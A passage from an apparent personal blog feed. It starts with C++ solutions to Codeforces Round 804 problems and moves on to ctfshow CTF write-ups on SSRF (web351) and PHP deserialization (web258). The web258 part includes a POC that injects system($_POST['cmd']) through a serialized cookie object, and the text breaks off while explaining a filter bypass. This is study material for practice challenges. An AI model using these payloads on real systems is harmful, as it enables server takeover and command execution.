class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1 1 %d\n&quot;</span>,(n/<span class="number">2</span>)^<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Bit-Flipping"><a href="#B-Bit-Flipping" class="headerlink" title="B. Bit Flipping"></a>B. Bit Flipping</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题目就是说，构造一个给定长度的矩阵，矩阵的每个格子值为0或者1，要求对于每一个格子，都有两个相邻的与之颜色不一样的格子，并且只能有两个。</p><p>大部分同学可能找规律，但是我后面想到了一个递推的方式，从小的矩阵扩展。因为已有的矩阵必然满足以上条件，因此如果对矩阵进行扩展，那么扩展的一列必须和被扩展的那一列值一模一样，由于宽高都为偶数，因此我们再次扩充的一列必须与被扩展列完全相反。如此一来达到了我们所构造的目标，我们最终构造的图形为</p><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/3.png" alt="3"></p><p>初始化之后，根据长宽输出就可以了。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 52</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<span class="comment">//ÐÐÁÐ </span></span><br><span class="line">    <span class="comment">//memset(a,-1,sizeof(a));</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(n,m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=<span class="number">50</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2</span>;j+=<span class="number">2</span>)&#123;</span><br><span class="line">            a[i][j]=a[i<span class="number">-1</span>][j];</span><br><span class="line">            a[i][j+<span class="number">1</span>]=a[i<span class="number">-1</span>][j+<span class="number">1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j]=!a[i<span class="number">-1</span>][j];</span><br><span class="line">            a[i+<span class="number">1</span>][j+<span class="number">1</span>]=!a[i<span class="number">-1</span>][j+<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">50</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">3</span>;j&lt;=<span class="number">50</span>;j+=<span class="number">2</span>)&#123;</span><br><span class="line">            a[i][j]=a[i][j<span class="number">-1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j]=a[i+<span class="number">1</span>][j<span class="number">-1</span>];</span><br><span class="line">            a[i][j+<span class="number">1</span>]=!a[i][j<span class="number">-1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j+<span class="number">1</span>]=!a[i+<span class="number">1</span>][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/4.png" alt="4"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题目的意思是，求符合条件的排列数量，要求任意子区间内，满足未出现过的最小值相同，求排列数。先考虑一个问题，首先0的位置一定要相等，因为没有包括0，那么结果一定为0，包括了0，结果一定不为0。那么再考虑1，若区间同时包括0和1，那么结果一定不为1，因此1的位置也必须相同。那么再考虑2，同样，区间需要包括0，1，2时，结果才不为2及以下的值，但是这个时候就有两种情况，2在0和1之间或者2不在0和1之间。若在，那么我们可以在0~1的位置内任意放置2，因为我们若想同时包括0和1，则必须包括2，那么这个时候，2就可以在区间内任意位置，对方案数做出贡献。如果不在，那么2同样也只能固定位置。以此类推，我们设置一个区间，若数在区间外，则扩展区间，若在区间内，则区间内剩余的位置都可以放置。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">        a[m]=i;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">int</span> l=a[<span class="number">0</span>],r=a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> range=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">bool</span> flag=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;r)&#123;</span><br><span class="line">            r=a[i];</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;l)&#123;</span><br><span class="line">            l=a[i];</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        range=r-l;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            ans*=(range-i+<span class="number">1</span>);</span><br><span class="line">            ans%=mod;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>啥也不说了，猛练吧。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow刷题记录-web351</title>
      <link href="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/"/>
      <url>/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/</url>
      
        <content type="html"><![CDATA[<p>今天学学 <code>ssrf</code>，有些服务器的某些资源可能会规定请求必须来自内网才能访问资源，如果不是内网用户则会被拒，而 <code>ssrf</code> 就能为我们提供一个内网访问的通道。</p><span id="more"></span><h2 id="浅析ssrf"><a href="#浅析ssrf" class="headerlink" title="浅析ssrf"></a>浅析ssrf</h2><blockquote><p>在计算机安全中，服务器端请求伪造（英语：Server-side Request Forgery，简称SSRF）是攻击者滥用服务器功能来访问或操作无法被直接访问的信息的方式之一</p></blockquote><p>在之前做过的题目种，我们已经初步接触过本地网页限制访问资源的例子，但是我们都可以伪造，比如 <code>referer</code> 字段或者是 <code>X-Forwarded-for</code> 字段，因为包含在我们请求的 <code>headers</code> 中，因此我们可以直接伪造。但是 <code>$_SERVER</code> 就是我们所不能伪造的了，这个变量是什么呢？</p><blockquote><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。这也就意味着大量的此类变量都会在<a href="http://www.faqs.org/rfcs/rfc3875">» CGI 1.1 规范</a>中说明，所以应该仔细研究一下。</p></blockquote><p>所以我们对 <code>SERVER</code> 变量进行校验即可判断请求是否来自本地，如果不来自本地则直接拒绝掉。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;非本地访问&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;flag&#123;test_flag&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现是无法访问的。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/1.png" alt="1"></p><p>只有我们在本机使用环回地址才能访问成功。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/2.png" alt="2"></p><p>那么我们最主要就是如何让服务器代我们发起请求，如果能代我们发起请求，那就会造成给 <code>ssrf</code>。</p><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一步一步解读。</p><p>第一个从 <code>url</code> 参数中获取 <code>url</code>。</p><ul><li><code>curl_init</code>：初始化一个 <code>cURL</code> 会话，参数可以为空，或者为一个 <code>url</code></li><li><code>curl_setopt</code>：设置 <code>cURL</code> 会话的一些属性。</li><li><code>curl_exec</code>：根据参数选项执行 <code>curl</code> 命令，并把结果返回给浏览器。</li><li><code>curl_close</code>：关闭会话</li></ul><p>就是直接可以请求一个网页，然后可以发现底下有 <code>flag.php</code>，但是只有本地能访问，因此在这里我们让 <code>curl</code> 去请求 <code>127.0.0.1/flag.php</code> 即可。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/3.png" alt="3"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> ssrf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow刷题记录-web258</title>
      <link href="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/"/>
      <url>/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/</url>
      
        <content type="html"><![CDATA[<p>ctfshow的刷题记录-web258</p><span id="more"></span><p>反序列化寻思着多做点吧，反序列化主要就是写poc，去构造符合要求的对象。</p><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过读源码可以发现有一个 <code>backDoor</code> 类，它能让我们使用 <code>eval</code> 进行命令执行。采用cookie传入poc反序列化，我们让 <code>ctfShowUser</code> 这个 <code>class</code> 属性为 <code>backDoor</code> 的一个对象，并且 <code>code</code> 需要我们任意可才能进行命令执行，执行 <code>getinfo</code> 即可触发，在 <code>ctfShowUser</code> 类中的析构函数会调用执行，于是我们写出如下 <code>poc</code>。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写出poc之后还要注意，这里的 <code>poc</code> 不能有类似 <code>O:数字</code> 或者是 